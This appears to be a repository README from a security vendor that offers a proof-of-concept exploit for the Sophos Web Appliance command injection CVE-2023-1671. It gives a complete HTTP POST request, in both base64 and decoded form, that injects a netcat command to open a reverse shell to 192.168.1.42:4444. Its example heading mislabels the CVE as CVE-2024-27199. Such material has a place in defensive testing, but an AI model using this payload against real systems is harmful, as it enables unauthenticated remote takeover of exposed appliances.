# Sophos CVE-2023-1671 PoC Exploit
CISA added Sophos Web Appliance CVE-2023-1671 Command Injection vulnerability into the Known Exploited Vulnerabilities (KEV) catalog. Although it was disclosed in April 2023, CVE-2023-1671 is actively being exploited in the wild.<br><br>
In this repo, Picus provides Proof-of-Concept exploit for the CVE-2023-1671 vulnerability.

Test security controls against the CVE-2023-1671 vulnerability exploit 
--------------------------------------
Picus can help you simulate the CVE-2023-1671 vulnerability exploits for free. No setup or signup required.<br>
Use [Picus Emerging Threat Simulator](https://insights.picussecurity.com/emerging-threat-simulator-announcement?utm_source=github&utm_medium=organic+social&utm_campaign=PLS+Offensive+-+ET+Simulator) and test your defenses in a few clicks.<br> 

If you are looking for more detailed information check out our blog post: [CVE-2023-1671: Sophos Command Injection Vulnerability Exploited in the Wild](https://www.picussecurity.com/resource/blog/cve-2023-1671-sophos-command-injection-vulnerability-exploited-in-the-wild)


CVE-2023-1671 Proof-of-concept (POC)
----------------------
Sophos CVE-2023-1671 vulnerability stems from a vulnerable component named warn-proceed handler. The weakness is classified as CWE-77 and allows adversaries to manipulate input for pre-authenticated command injection. User inputs sent through "/index.php?c=blocked" using an HTTP POST request are routed to UsrBlocked.php and processed by escapeshellarg function.<br>

The example HTTP POST request below exploits CVE-2023-1671 vulnerability to establish a reverse shell connection.

#### Example CVE-2024-27199 Exploit:
```http
— Base-64 encoded
POST /index.php?c=blocked&action=continue HTTP/1.1
args_reason=filetypewarn&url=2XcjgUjbpYUmeBZwMmuiC9x9Tdy&filetype=2XcjgUjbpYUmeBZwMmuiC9x9Tdy&user=2XcjgUjbpYUmeBZwMmuiC9x9Tdy&user_encoded=JztuYyAtZSAvYmluL3NoIDE5Mi4xNjguMS40MiA0NDQ0ICM=
— Base-64 decoded

POST /index.php?c=blocked&action=continue HTTP/1.1
args_reason=filetypewarn&url=2XcjgUjbpYUmeBZwMmuiC9x9Tdy&filetype=2XcjgUjbpYUmeBZwMmuiC9x9Tdy&user=2XcjgUjbpYUmeBZwMmuiC9x9Tdy&user_encoded=';nc -e /bin/sh 192.168.1.42 4444 #
```

Disclaimer
----------
We do not have any disclamer.
